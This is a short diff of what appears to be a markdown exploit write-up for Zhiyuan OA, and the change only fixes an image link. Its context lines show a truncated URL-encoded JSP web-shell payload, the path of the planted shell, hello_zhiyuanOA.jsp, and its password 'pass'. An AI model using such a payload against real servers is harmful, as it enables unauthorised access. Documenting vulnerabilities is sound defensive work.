@@ -37,4 +37,4 @@ t=%3C%25%21+String+xc%3D%223c6e0b8a9c15224a%22%3B+String+pass%3D%22pass%22%3B+St
 http://{{Hostname}}/yyoa/hello_zhiyuanOA.jsp
 密码：pass
 ```
-!()[img/gsl.png]
+![](img/gsl.png)
